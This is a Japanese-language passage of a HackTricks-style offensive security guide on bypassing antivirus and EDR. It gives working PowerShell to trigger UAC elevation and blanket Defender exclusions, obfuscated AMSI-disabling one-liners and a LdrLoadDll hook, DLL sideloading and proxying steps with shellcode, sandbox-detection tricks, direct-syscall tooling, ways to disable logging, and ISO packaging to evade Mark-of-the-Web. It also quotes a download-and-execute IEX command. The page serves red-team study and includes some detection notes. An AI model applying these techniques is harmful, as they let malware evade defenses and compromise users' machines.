# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**このページは最初に** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって執筆されました！**

## Defenderの停止

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defenderの動作を停止するツール。
- [no-defender](https://github.com/es3n1n/no-defender): 別のAVを偽装してWindows Defenderの動作を停止するツール。
- [管理者の場合はDefenderを無効化](basic-powershell-for-pentesters/README.md)

### Defenderを改変する前にInstaller-style UAC baitを使用する

Game cheatsを装うPublic loadersは、署名されていないNode.js/Nexe installersとして配布されることが多く、最初に**ユーザーに昇格を要求**してからDefenderを無効化します。流れは単純です。

1. `net session`で管理者コンテキストを確認します。このコマンドは実行元がadmin権限を持っている場合にのみ成功するため、失敗した場合はloaderがstandard userとして実行されていることを示します。
2. `RunAs` verbを使用して自身を直ちに再起動し、元のcommand lineを維持したまま、想定されるUAC consent promptを表示します。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
被害者はすでに「cracked」softwareをインストールしていると信じているため、promptは通常受け入れられ、malwareにDefenderのpolicyを変更するために必要な権限が与えられます。

### すべてのdrive letterに対する包括的な`MpPreference` exclusions

権限昇格後、GachiLoader-style chainsはserviceを完全に無効化するのではなく、Defenderのblind spotを最大化します。loaderはまずGUI watchdog（`taskkill /F /IM SecHealthUI.exe`）をkillし、その後、すべてのuser profile、system directory、removable diskをscan不能にする**極めて広範なexclusions**を適用します：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
主な観察事項:

- ループはマウントされているすべてのファイルシステム（D:\、E:\、USBメモリなど）を走査するため、**今後ディスク上のどこかに配置される payload はすべて無視されます**。
- `.sys` 拡張子の除外は将来を見据えたもので、攻撃者は今後 Defender に再度触れることなく、署名されていないドライバーをロードする選択肢を確保できます。
- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 配下に反映されるため、後続ステージでは、UAC を再度トリガーせずに除外設定が維持されていることを確認したり、除外を拡張したりできます。

Defender サービスは停止されないため、単純なヘルスチェックでは「antivirus active」と報告され続けますが、実際のリアルタイム検査はそれらのパスに対して一切行われません。

## **AV Evasion Methodology**

現在、AV はファイルが悪意のあるものかどうかを確認するために、さまざまな手法を使用しています。static detection、dynamic analysis、そしてより高度な EDR では behavioural analysis が使われます。

### **Static detection**

Static detection は、binary や script 内の既知の悪意ある文字列またはバイト配列を検出し、さらにファイル自体から情報（例: ファイルの説明、会社名、digital signatures、アイコン、checksum など）を抽出することで実現されます。つまり、既知の public tools を使用すると、より簡単に検出される可能性があります。おそらくそれらはすでに分析され、悪意のあるものとしてフラグ付けされているためです。この種の検出を回避する方法はいくつかあります。

- **Encryption**

binary を暗号化すれば、AV がプログラムを検出する方法はなくなりますが、プログラムを復号してメモリ上で実行するための何らかの loader が必要になります。

- **Obfuscation**

binary や script 内の一部の文字列を変更するだけで AV を通過できる場合もありますが、何を obfuscate しようとしているかによっては、時間のかかる作業になります。

- **Custom tooling**

独自の tools を開発すれば、既知の悪意ある signature は存在しませんが、多くの時間と労力が必要です。

> [!TIP]
> Windows Defender の static detection に対するチェックには [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) が便利です。基本的にはファイルを複数のセグメントに分割し、それぞれを個別に Defender にスキャンさせます。これにより、binary 内のどの文字列やバイトがフラグ付けされたのかを正確に確認できます。

実践的な AV Evasion については、この [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) をぜひ確認することを強くおすすめします。

### **Dynamic analysis**

Dynamic analysis とは、AV が sandbox 内で binary を実行し、悪意ある活動（例: browser のパスワードを復号して読み取ろうとする、LSASS に対して minidump を実行するなど）を監視することです。この部分への対処はやや難しい場合がありますが、sandbox を回避するためにできることをいくつか紹介します。

- **実行前に Sleep する** 実装方法によっては、AV の dynamic analysis を回避する優れた方法になります。AV がファイルをスキャンできる時間は、ユーザーのワークフローを妨げないよう非常に短く設定されています。そのため、長い sleep を使用すると binary の分析を妨害できます。ただし、多くの AV sandbox は、実装方法によっては sleep を単純にスキップできます。
- **マシンのリソースを確認する** 通常、Sandbox には使用できるリソースがほとんどありません（例: < 2GB RAM）。そうでなければ、ユーザーのマシンの動作を遅くしてしまう可能性があるためです。ここでは非常に創造的な方法も使えます。たとえば CPU の温度や fan speed まで確認できます。sandbox 内ですべてが実装されているとは限りません。
- **マシン固有のチェック** 「contoso.local」domain に参加している workstation のユーザーを標的にしたい場合、computer の domain を確認し、指定したものと一致するかチェックできます。一致しなければ、プログラムを終了させることができます。

Microsoft Defender の Sandbox computername は HAL9TH であることが判明しています。そのため、detonation 前に malware 内で computer name を確認できます。名前が HAL9TH と一致する場合、Defender の sandbox 内にいることを意味するため、プログラムを終了させることができます。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox に対抗するための、[@mgeeky](https://twitter.com/mariuszbit) によるその他の優れた tips

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この post で前述したように、**public tools** は最終的に **検出されます**。そのため、次のことを自問すべきです。

たとえば、LSASS を dump したい場合、**本当に mimikatz を使う必要がありますか**？ それとも、あまり知られていない別の project で LSASS を dump できますか？

おそらく、正しい答えは後者です。mimikatz を例に取ると、AV や EDR によって最も多くフラグ付けされている malware の一つ、あるいは最も多いものだと思われます。project 自体は非常に優れていますが、AV を回避するために扱うのは悪夢のように困難です。そのため、達成したい目的に対する alternative を探してください。

> [!TIP]
> Evasion のために payloads を変更する際は、Defender の **automatic sample submission を無効にする** ようにしてください。そして、長期的に Evasion を達成することが目的なら、**VirusTotal には絶対に UPLOAD しないでください**。特定の AV で payload が検出されるか確認したい場合は、VM にその AV を install し、automatic sample submission を無効にしてから、結果に満足するまでそこでテストしてください。

## EXEs vs DLLs

可能な場合は常に、Evasion には **DLLs の使用を優先してください**。私の経験では、DLL files は通常 **検出や分析を受ける可能性がはるかに低い** ため、payload を DLL として実行する何らかの方法がある場合には、検出を回避するための非常に簡単な trick になります。

この画像から分かるように、Havoc の DLL Payload は antiscan.me で 4/26 の detection rate である一方、EXE payload の detection rate は 7/26 です。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>通常の Havoc EXE payload と通常の Havoc DLL の antiscan.me における比較</p></figcaption></figure>

ここからは、DLL files を使ってさらに stealthier にするための tricks をいくつか紹介します。

## DLL Sideloading & Proxying

**DLL Sideloading** は、victim application と malicious payload(s) を隣り合わせに配置することで、loader が使用する DLL search order を利用します。

[Siofra](https://github.com/Cybereason/siofra) と次の powershell script を使用して、DLL Sideloading の影響を受けやすい programs を確認できます。
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
このコマンドは、"C:\Program Files\\" 内で DLL hijacking の影響を受けやすいプログラムの一覧と、それらが load しようとする DLL files を出力します。

**DLL Hijackable/Sideloadable programs** は、ぜひ自分で **explore** することを強くおすすめします。この technique は適切に実行すればかなり stealthy ですが、publicly known な DLL Sideloadable programs を使用すると、簡単に caught される可能性があります。

プログラムが load を想定している名前の malicious DLL を配置するだけでは、payload は load されません。これは、プログラムがその DLL 内にある特定の functions を想定しているためです。この問題を解決するために、**DLL Proxying/Forwarding** と呼ばれる別の technique を使用します。

**DLL Proxying** は、プログラムが行う calls を proxy（および malicious）DLL から original DLL へ forward します。これにより、プログラムの functionality を維持しつつ、payload の execution を処理できるようになります。

ここでは、[@flangvik](https://twitter.com/Flangvik) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project を使用します。

以下が実行した steps です：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最後のコマンドにより、2つのファイルが生成されます。DLLのsource code templateと、名前が変更された元のDLLです。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
これらが結果です：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちの shellcode（[SGN](https://github.com/EgeBalci/sgn) でエンコード）と proxy DLL は、どちらも [antiscan.me](https://antiscan.me) で Detection rate が 0/26 でした！これは成功と言えるでしょう。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading についての [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) と、さらに詳しく学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を **強くおすすめします**。

### Forwarded Exports の悪用（ForwardSideLoading）

Windows PE modules は、実際には「forwarders」である functions を export できます。これは code を指す代わりに、export entry に `TargetDll.TargetFunc` 形式の ASCII string が含まれるものです。caller が export を resolve すると、Windows loader は次の処理を行います：

- まだ loaded されていない場合は `TargetDll` を Load する
- `TargetDll` から `TargetFunc` を Resolve する

理解しておくべき主な挙動：
- `TargetDll` が KnownDLL の場合、protected な KnownDLLs namespace（例：ntdll、kernelbase、ole32）から提供されます。
- `TargetDll` が KnownDLL でない場合は、通常の DLL search order が使用されます。これには forward resolution を実行している module の directory が含まれます。

これにより、間接的な sideloading primitive が可能になります。まず、non-KnownDLL module name に forward された function を export している signed DLL を見つけます。次に、その signed DLL を、forward された target module と完全に同じ名前の attacker-controlled DLL と同じ directory に配置します。forwarded export が invoke されると、loader は同じ directory からあなたの DLL を resolve して load し、DllMain を実行します。

Windows 11 で確認された例：
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決されます。

PoC（copy-paste）:
1) 署名済みの system DLL を書き込み可能なフォルダにコピーする
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。コード実行には最小限の DllMain で十分です。DllMain をトリガーするために、転送関数を実装する必要はありません。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 署名付き LOLBin でフォワードをトリガーする:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (署名付き) は side-by-side の `keyiso.dll` (署名付き) をロードする
- `KeyIsoSetAuditingInterface` の解決中に、ローダーは `NCRYPTPROV.SetAuditingInterface` への forward をたどる
- その後、ローダーは `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
- `SetAuditingInterface` が実装されていない場合、`DllMain` の実行後にのみ "missing API" エラーが発生する

Hunting のヒント:
- 転送された export のうち、対象モジュールが KnownDLL ではないものに注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている
- 次のような tooling を使って、転送された export を列挙できる:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 候補を検索するには、Windows 11 forwarder inventory を参照してください: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- LOLBins（例: `rundll32.exe`）が非システムパスから署名済み DLL を読み込み、その後、そのディレクトリから同じベース名を持つ非 KnownDLLs を読み込む動作を監視する
- `rundll32.exe` → 非システムの `keyiso.dll` → ユーザーが書き込み可能なパス配下の `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンを検知する
- code integrity policies（WDAC/AppLocker）を適用し、アプリケーションディレクトリでの write+execute を拒否する

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze を使用すると、shellcode をステルス性の高い方法でロードして実行できます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasionはいたちごっこのようなもので、今日有効なものが明日には検知される可能性があります。そのため、1つのツールだけに依存せず、可能であれば複数のEvasion techniqueをチェーンしてください。

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRはしばしば、`ntdll.dll`のsyscall stubに**user-mode inline hook**を設定します。これらのhookをバイパスするには、正しい**SSN**（System Service Number）をロードし、hookされたexport entrypointを実行せずにkernel modeへ移行する**direct**または**indirect syscall stub**を生成できます。

**Invocation options:**
- **Direct (embedded)**: 生成されたstubに`syscall`/`sysenter`/`SVC #0`命令を埋め込みます（`ntdll` exportには到達しません）。
- **Indirect**: `ntdll`内に存在する`syscall` gadgetへjumpし、kernel transitionが`ntdll`から開始されたように見せます（heuristic evasionに有用です）。**randomized indirect**では、callごとにpoolからgadgetを選択します。
- **Egg-hunt**: staticな`0F 05` opcode sequenceをdisk上に埋め込むことを避け、runtimeでsyscall sequenceを解決します。

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytesを読み取る代わりに、virtual address順にsyscall stubをsortしてSSNを推測します。
- **SyscallsFromDisk**: cleanな`\KnownDlls\ntdll.dll`をmapし、その`.text`からSSNを読み取った後、unmapします（memory上のすべてのhookをバイパスします）。
- **RecycledGate**: VA-sorted SSN inferenceとopcode validationを組み合わせ、stubがcleanな場合はそれを使用します。hookされている場合はVA inferenceにfallbackします。
- **HW Breakpoint**: `syscall`命令にDR0を設定し、VEHを使用してruntimeに`EAX`からSSNを取得します。これにより、hookされたbytesをparseする必要がありません。

SysWhispers4の使用例:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防止するために作成されました。当初、AVは**ディスク上のファイル**のみスキャン可能でした。そのため、何らかの方法でpayloadsを**直接in-memoryで**実行できれば、AVにはそれを防止する手段がありませんでした。十分な可視性がなかったためです。

AMSI機能は、Windowsの以下のコンポーネントに統合されています。

- User Account Control、またはUAC（EXE、COM、MSI、またはActiveXのインストール時の昇格）
- PowerShell（scripts、interactive use、dynamic code evaluation）
- Windows Script Host（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBA macros

これにより、antivirus solutionsは、script contentsを暗号化もobfuscationもされていない形式で公開することで、script behaviorを検査できます。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで以下のalertが生成されます。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`に続いて、そのscriptを実行したexecutableへのpathが付加されていることに注目してください。この場合はpowershell.exeです。

ディスクにファイルをdropしていませんが、それでもAMSIによってin-memoryで検知されました。

さらに、**.NET 4.8**以降では、C# codeもAMSIを通過します。これは、in-memory executionのために`Assembly.Load(byte[])`でloadする場合にも影響します。そのため、AMSIをevadeしたい場合は、in-memory executionに低いバージョンの.NET（4.7.2以下など）を使用することが推奨されます。

AMSIを回避する方法はいくつかあります。

- **Obfuscation**

AMSIは主にstatic detectionsで動作するため、loadしようとするscriptsを変更することは、detectionをevadeする有効な方法になります。

ただし、AMSIには、複数のlayerがあってもscriptsのunobfuscationを行う機能があります。そのため、obfuscationは実行方法によっては悪い選択肢になる可能性があります。これにより、evadeはそれほどstraightforwardではありません。ただし、場合によっては、variable namesをいくつか変更するだけで十分なこともあるため、何がどの程度flaggedされているかによります。

- **AMSI Bypass**

AMSIはDLLをpowershell（およびcscript.exe、wscript.exeなど）のprocessにloadすることで実装されているため、unprivileged userとして実行していても簡単にtamperできます。AMSIの実装におけるこの欠陥により、researchersはAMSI scanningをevadeする複数の方法を発見しました。

**Forcing an Error**

AMSI initializationを強制的にfailさせる（amsiInitFailed）と、current processに対するscanは開始されません。これは当初、[Matt Graeber](https://twitter.com/mattifestation)によってdiscloseされ、Microsoftはその広範な使用を防止するsignatureを開発しました。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
現在の powershell プロセスで AMSI を使用不能にするのに必要だったのは、powershell code 1行だけでした。もちろん、この行自体は AMSI によって検出されるため、この technique を使用するには何らかの modification が必要です。

以下は、この [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した modified AMSI bypass です。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

この technique は当初 [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されたもので、amsi.dll 内の "AmsiScanBuffer" function（user-supplied input のスキャンを担当）の address を見つけ、E_INVALIDARG の code を返す instructions で上書きします。これにより、実際の scan の結果は 0 を返し、clean result として解釈されます。

> [!TIP]
> より詳しい説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。

AMSI を powershell で bypass するために使用される他の technique も数多くあります。詳細については、[**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を確認してください。

### amsi.dll の load を防止して AMSI を block する（LdrLoadDll hook）

AMSI は `amsi.dll` が current process に load された後にのみ initialise されます。robust で language‑agnostic な bypass は、`ntdll!LdrLoadDll` に user-mode hook を配置し、要求された module が `amsi.dll` の場合に error を返す方法です。その結果、AMSI は load されず、その process では scan が発生しません。

Implementation outline（x64 C/C++ pseudocode）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
注記
- PowerShell、WScript/CScript、custom loaders のいずれでも機能します（それ以外の場合に AMSI をロードするものすべて）。
- stdin 経由で script を渡す方法（`PowerShell.exe -NoProfile -NonInteractive -Command -`）と組み合わせると、長い command-line artefacts を回避できます。
- LOLBins 経由で実行される loaders での使用が確認されています（例：`regsvr32` が `DllRegisterServer` を呼び出す場合）。

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** という tool も AMSI を bypass する script を生成します。
**[https://amsibypass.com/](https://amsibypass.com/)** という tool も AMSI を bypass する script を生成します。randomized user-defined function、variables、characters expression を使用し、PowerShell keywords の character casing をランダムに適用することで signature を回避します。

**検出された signature を削除する**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** や **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** などの tool を使用して、現在の process の memory から検出された AMSI signature を削除できます。この tool は、現在の process の memory を AMSI signature について scan し、その後 NOP instructions で上書きすることで機能し、実質的に memory から削除します。

**AMSI を使用する AV/EDR products**

AMSI を使用する AV/EDR products の一覧は **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** で確認できます。

**Powershell version 2 を使用する**
PowerShell version 2 を使用すると AMSI はロードされないため、AMSI に scan されずに scripts を実行できます。次のように実行できます：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell loggingは、システム上で実行されたすべてのPowerShellコマンドを記録できる機能です。これは監査やトラブルシューティングに役立ちますが、**検知を回避したい攻撃者にとっては問題**にもなります。

PowerShell loggingをバイパスするには、以下のテクニックを使用できます。

- **PowerShell TranscriptionとModule Loggingを無効化する**: この目的には、[https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) のようなツールを使用できます。
- **Powershell version 2を使用する**: PowerShell version 2を使用するとAMSIがロードされないため、AMSIによるスキャンを受けずにスクリプトを実行できます。次のように実行します: `powershell.exe -version 2`
- **Unmanaged Powershell Sessionを使用する**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) を使用して、防御機能のないpowershellを起動します（これはCobal Strikeの`powerpick`が使用している方法です）。


## Obfuscation

> [!TIP]
> 複数のobfuscationテクニックではデータを暗号化するため、バイナリのentropyが増加し、AVやEDRによる検知が容易になります。この点に注意し、暗号化はコード内の機密性が高い、または隠す必要がある特定のセクションにのみ適用することを検討してください。

### ConfuserExで保護された.NET BinariesのDeobfuscating

ConfuserEx 2（または商用forks）を使用するmalwareを分析する際には、decompilerやsandboxを妨害する複数の保護レイヤーに遭遇することがよくあります。以下のworkflowでは、後からdnSpyやILSpyなどのツールでC#にdecompileできる、ほぼオリジナルのILを確実に**復元**できます。

1.  Anti-tamperingの除去 – ConfuserExはすべての*method body*を暗号化し、*module*のstatic constructor（`<Module>.cctor`）内で復号します。また、PE checksumにもパッチを適用するため、変更を加えるとバイナリがクラッシュします。**AntiTamperKiller**を使用して、暗号化されたmetadata tablesを特定し、XOR keysを復元して、クリーンなassemblyを書き出します:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
出力には6つのanti-tamper parameters（`key0-key3`、`nameHash`、`internKey`）が含まれます。これらは独自のunpackerを構築する際に役立ちます。

2.  Symbol / control-flowの復元 – *clean* fileを**de4dot-cex**（ConfuserExに対応したde4dotのfork）に渡します。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profileを選択します
• de4dotはcontrol-flow flatteningを元に戻し、元のnamespaces、classes、variable namesを復元し、constant stringsを復号します。

3.  Proxy-callの除去 – ConfuserExは、decompilationをさらに妨害するため、直接的なmethod callsを軽量なwrappers（別名*proxy calls*）に置き換えます。**ProxyCall-Remover**でこれらを除去します:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
この手順の後、opaque wrapper functions（`Class8.smethod_10`など）ではなく、`Convert.FromBase64String`や`AES.Create()`のような通常の.NET APIが確認できるはずです。

4.  Manual clean-up – 生成されたbinaryをdnSpyで実行し、large Base64 blobsまたは`RijndaelManaged`/`TripleDESCryptoServiceProvider`の使用箇所を検索して、*real* payloadの位置を特定します。malwareは多くの場合、`<Module>.byte_0`内で初期化されるTLV-encoded byte arrayとしてpayloadを保存しています。

上記のchainにより、malicious sampleを実行する必要なくexecution flowを復元できます。これはoffline workstationで作業する際に役立ちます。

> 🛈  ConfuserExは`ConfusedByAttribute`というcustom attributeを生成します。これは、sampleを自動的にtriageするためのIOCとして使用できます。

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)と改ざん防止によってソフトウェアセキュリティを向上させられる、[LLVM](http://www.llvm.org/) compilation suiteのオープンソースforkを提供することです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使用したりcompilerを変更したりせずに、`C++11/14` languageを使用してcompile時にobfuscated codeを生成する方法を示します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkによって生成されたobfuscated operationsのレイヤーを追加し、applicationをcrackしようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなpe filesをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意のexecutables向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使用するLLVM-supported languages向けのfine-grained code obfuscation frameworkです。ROPfuscatorは、通常のinstructionsをROP chainsに変換することでassembly code levelでprogramをobfuscateし、通常のcontrol flowに対する自然な認識を妨げます。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): NimcryptはNimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをshellcodeに変換し、その後loadできます。

## SmartScreenとMoTW

インターネットからいくつかのexecutablesをdownloadして実行したときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のあるapplicationsの実行からend userを保護するためのsecurity mechanismです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-based approachで動作します。つまり、一般的でないdownload applicationsはSmartScreenをtriggerし、end userにalertを表示してfileの実行を阻止します（ただし、More Info -> Run anywayをクリックすればfileを実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)であり、インターネットからfilesをdownloadすると、download元のURLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからdownloadしたfileのZone.Identifier ADSを確認しています。</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名されたexecutablesは、**SmartScreenをtriggerしない**ことに注意することが重要です。

payloadsがMark of The Webを取得しないようにする非常に効果的な方法は、ISOなどのcontainer内にpackagingすることです。これは、Mark-of-the-Web（MOTW）を**non NTFS** volumesに適用することが**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにpayloadsをoutput containersへpackagingするtoolです。

使用例:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
